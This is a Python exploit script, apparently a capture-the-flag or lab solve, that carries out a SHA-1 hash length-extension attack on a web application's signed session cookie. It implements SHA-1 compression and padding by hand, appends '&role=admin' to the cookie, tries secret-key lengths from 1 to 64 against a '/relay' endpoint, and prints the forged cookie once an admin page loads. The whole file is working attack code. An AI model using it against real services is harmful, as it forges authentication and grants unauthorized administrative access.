import hashlib
import http.cookiejar
import re
import struct
import urllib.error
import urllib.request
import sys

BASE = sys.argv[1].rstrip('/')
MASK = 0xffffffff

def rol(x, n):
    return ((x << n) | (x >> (32 - n))) & MASK

def block(state, chunk):
    w = list(struct.unpack('>16I', chunk))
    for j in range(16, 80):
        w.append(rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1))
    a, b, c, d, e = state
    for j in range(80):
        if j < 20:
            f, k = (b & c) | (~b & d), 0x5a827999
        elif j < 40:
            f, k = b ^ c ^ d, 0x6ed9eba1
        elif j < 60:
            f, k = (b & c) | (b & d) | (c & d), 0x8f1bbcdc
        else:
            f, k = b ^ c ^ d, 0xca62c1d6
        a, b, c, d, e = (rol(a, 5) + f + e + k + w[j]) & MASK, a, rol(b, 30), c, d
    return tuple((x + y) & MASK for x, y in zip(state, (a, b, c, d, e)))

def pad(length):
    return b'\x80' + b'\x00' * ((55 - length) % 64) + struct.pack('>Q', length * 8)

def extend(digest, suffix, consumed):
    state = struct.unpack('>5I', bytes.fromhex(digest))
    final = suffix + pad(consumed + len(suffix))
    assert len(final) % 64 == 0
    for pos in range(0, len(final), 64):
        state = block(state, final[pos:pos + 64])
    return struct.pack('>5I', *state).hex()

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
opener.open(BASE + '/', timeout=8).read()
cookie = next(c.value for c in jar if c.name == 'session')
raw_hex, digest = cookie.split('.')
message = bytes.fromhex(raw_hex)
print('original', message, digest, flush=True)
suffix = b'&role=admin'
lengths = [16, 20, 24, 32, 40, 8, 12, 28, 36, 48, 64] + [i for i in range(1, 65) if i not in [16, 20, 24, 32, 40, 8, 12, 28, 36, 48, 64]]
for keylen in lengths:
    glue = pad(keylen + len(message))
    forged = (message + glue + suffix).hex() + '.' + extend(digest, suffix, keylen + len(message) + len(glue))
    request = urllib.request.Request(BASE + '/relay', headers={'Cookie': 'session=' + forged})
    try:
        response = urllib.request.urlopen(request, timeout=8)
        body = response.read().decode(errors='replace')
        code = response.status
        location = response.url
    except urllib.error.HTTPError as e:
        code = e.code
        body = e.read().decode(errors='replace')
        location = BASE + '/relay'
    print('keylen', keylen, 'status', code, 'url', location, 'title', re.search(r'<title>(.*?)</title>', body).group(1), flush=True)
    if code == 200 and ('Relay Control' in body):
        print('FORGED_COOKIE', forged, flush=True)
        print('RELAY_BODY', body, flush=True)
        break
